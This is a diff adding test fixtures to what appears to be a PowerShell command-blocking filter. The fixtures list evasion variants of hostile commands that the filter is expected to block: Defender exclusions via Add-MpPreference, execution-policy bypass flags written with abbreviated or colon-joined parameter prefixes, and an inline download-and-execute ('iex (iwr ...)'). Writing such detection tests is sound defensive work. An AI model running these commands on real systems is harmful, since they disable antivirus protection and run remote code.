@@ -1703,6 +1703,42 @@ expected_action = "block"
 expected_rules = ["ps_set_execution_policy_bypass"]
 
 [[fixture]]
+name = "ps_call_operator_set_execution_policy_bypass"
+min_milestone = 5
+input = "& 'Set-ExecutionPolicy' Bypass -Scope Process -Force"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_set_execution_policy_bypass"]
+
+[[fixture]]
+name = "ps_call_operator_defender_exclusion"
+min_milestone = 5
+input = "& Add-MpPreference -ExclusionPath C:\\Temp"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_defender_exclusion"]
+
+[[fixture]]
+name = "ps_call_operator_inline_download_execute"
+min_milestone = 5
+input = "& iex (iwr https://example-cli.dev/install.ps1)"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_inline_download_execute"]
+
+[[fixture]]
+name = "ps_background_operator_followed_by_defender_exclusion"
+min_milestone = 5
+input = "Get-Date & Add-MpPreference -ExclusionProcess malware.exe"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_defender_exclusion"]
+
+[[fixture]]
 name = "ps_defender_exclusion_path"
 min_milestone = 5
 input = "Add-MpPreference -ExclusionPath C:\\Users\\user\\AppData"
@@ -1854,6 +1890,34 @@ shell = "powershell"
 expected_action = "block"
 expected_rules = ["ps_set_execution_policy_bypass"]
 
+[[fixture]]
+name = "ps_set_execution_policy_bypass_exec_prefix"
+min_milestone = 5
+input = "powershell -exec Bypass -Command \"echo hi\""
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_set_execution_policy_bypass"]
+
+[[fixture]]
+name = "ps_set_execution_policy_bypass_executionp_joined_prefix"
+min_milestone = 5
+input = "pwsh -executionp:Bypass -Command \"echo hi\""
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_set_execution_policy_bypass"]
+
+[[fixture]]
+name = "ps_execution_policy_non_prefix_is_not_treated_as_bypass_flag"
+min_milestone = 5
+input = "powershell -export Bypass"
+context = "exec"
+shell = "powershell"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["ps_set_execution_policy_bypass"]
+
 # PR #121 fix-list item 12 — same colon-joined form, but on the cmdlet
 # branch (the cmdlet path historically only looked for a bare `bypass`
 # token, never a `-ExecutionPolicy:Bypass` token). The post-fix cmdlet
@@ -1881,6 +1945,43 @@ context = "exec"
 shell = "powershell"
 expected_action = "block"
 expected_rules = ["ps_defender_exclusion"]
+
+[[fixture]]
+name = "ps_defender_exclusion_path_unique_prefix"
+min_milestone = 5
+input = "Add-MpPreference -ExclusionPa C:\\Temp"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_defender_exclusion"]
+
+[[fixture]]
+name = "ps_defender_exclusion_process_unique_prefix_joined"
+min_milestone = 5
+input = "Add-MpPreference -ExclusionPr:malware.exe"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_defender_exclusion"]
+
+[[fixture]]
+name = "ps_defender_exclusion_extension_unique_prefix"
+min_milestone = 5
+input = "Add-MpPreference -ExclusionE .ps1"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_defender_exclusion"]
+
+[[fixture]]
+name = "ps_defender_ambiguous_exclusion_prefix_is_not_resolved"
+min_milestone = 5
+input = "Add-MpPreference -ExclusionP value"
+context = "exec"
+shell = "powershell"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["ps_defender_exclusion"]
 
 # PowerShell 7+ pipeline chain operators `&&` and `||` are now first-class
 # separators in tokenize_powershell. With `;`-only splitting (the M5 chunk 1
